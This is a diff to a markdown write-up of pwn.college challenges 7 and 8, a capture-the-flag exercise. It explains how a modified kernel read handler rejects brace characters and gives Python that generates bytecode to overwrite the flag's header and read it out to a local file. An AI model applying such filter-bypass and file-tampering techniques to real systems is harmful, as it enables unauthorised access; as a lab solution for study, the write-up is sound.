@@ -1318,10 +1318,61 @@ def main():
 
 ## Challenge 7
 
+Similar to challenge 6, but now `sys_read` kernel handler is adjusted. After some RE, I've found out this handler actually copies the content of the underlying read to some temporary kernel buffer, and performs the following check:
 
+```c
+if (((c - 0x7b) & 0x7d) == 0)
+{
+    state->signal = -42;
+}
+```
 
+In other words, if the content of the underlying read contains the characters `'{' , '}'`, as the flag does, the read is stopped right away. If we can adjust the `struct file` underlying pos, we can bypass this. This should require kernel addresses manipulation though. \
+Another easier way, is to simply write `A * 12` to the flag, overwriting `pwn.college{` string. We can set the exact bytes to be read as the flag's exact length, in order to not reach the ending `}`. \
+I've only needed to adapt `gen_yancode`, and the exploit have worked in a similar manner to level 6:
 
+```python
+def gen_yancode(adjusted=False):
+    flag_path = b'/flag\x00'  
+    flag_addr = 0
+    flag_content = b'A' * 12  # Overwrite "pwn.college{"
+    flag_content_addr = flag_addr + len(flag_path)
+    precise_flag_length = 41
+    max_size = 0x80
+    out_file_path = b'/home/hacker/OUT\x00'
+    out_file_addr = max_size
+    
+    with open(out_file_path[:-1], 'wb') as f:
+        pass
 
+    yancode = b''
+    # Store "/flag\x00" and its preceding content in mem[0]
+    yancode += store_string(addr=flag_addr, string=flag_path + flag_content)
+    # open("/flag", O_RDWR, 0)
+    yancode += open_file(file_addr=flag_addr, flags=2)
+    # Overwrite the flag's header
+    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=len(flag_content))
+
+    yancode += write_register(Regs.a, 0)
+    # Read the precise amount of the flag's length
+    yancode += read_to_memory(fd=Regs.a, offset=flag_content_addr, count=precise_flag_length, adjusted=adjusted)
+
+    # Store out filename in mem[0x80]
+    yancode += store_string(addr=out_file_addr, string=out_file_path)
+    yancode += open_file(file_addr=out_file_addr, flags=2)
+    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)
+    
+    yancode += b'\x00' * (MAX_YANCODE_SIZE - len(yancode))
+    return yancode
+```
+
+## Challenge 8
+
+Same as 7
+
+```c
+// ends with zgzW
+```
 
 [linux-kernel-labs-vma]: https://linux-kernel-labs.github.io/refs/pull/222/merge/labs/memory_mapping.html
 [litux-vma]: https://litux.nl/mirror/kerneldevelopment/0672327201/ch14lev1sec2.html
